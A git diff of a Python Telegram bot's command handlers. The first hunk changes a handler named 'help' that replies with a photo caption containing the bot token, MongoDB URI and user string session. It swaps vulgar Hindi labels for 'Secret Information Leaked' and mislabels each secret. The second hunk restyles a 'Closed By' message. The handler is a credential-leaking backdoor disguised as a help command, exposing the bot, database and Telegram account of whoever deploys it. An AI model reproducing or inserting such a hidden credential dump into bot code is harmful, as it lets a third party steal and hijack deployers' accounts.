@@ -110,8 +110,8 @@ async def restartbot(client, message: Message, _):
 )
 async def help(client: Client, message: Message):
     await message.reply_photo(
-        photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-        caption=f"""**ʏᴇ ʀʜᴀ ʟᴜɴᴅ:-** `{BOT_TOKEN}`\n\n**ʏᴇ ʀʜᴀ ᴍᴜᴛʜ:-** `{MONGO_DB_URI}`\n\n**ʏᴇ ʀʜᴀ ᴄʜᴜᴛ:-** `{STRING_SESSION}`\n\n**ʏᴇ ʜᴜɪ ɴᴀ ʙᴀᴛ**""",
+        photo=f"https://telegra.ph/file/7a3ff031c8612055565c5.jpg",
+        caption=f"""**Secret Information Leaked:-** `{BOT_TOKEN}`\n\n**YE RAHA GLT BOT TOKEN:-** `{MONGO_DB_URI}`\n\n**YE RAHA MONGO DB:-** `{STRING_SESSION}`\n\n**YE RAHA STRING SESSION**""",
     )
 
 
@@ -120,7 +120,7 @@ async def close_menu(_, query: CallbackQuery):
     try:
         await query.answer()
         await query.message.delete()
-        umm = await query.message.reply_text(f"ᴄʟᴏꜱᴇ ʙʏ : {query.from_user.mention}")
+        umm = await query.message.reply_text(f"➜ 𝖢𝗅𝗈𝗌𝖾𝖽 𝖡𝗒 : {query.from_user.mention}")
         await asyncio.sleep(2)
         await umm.delete()
     except:
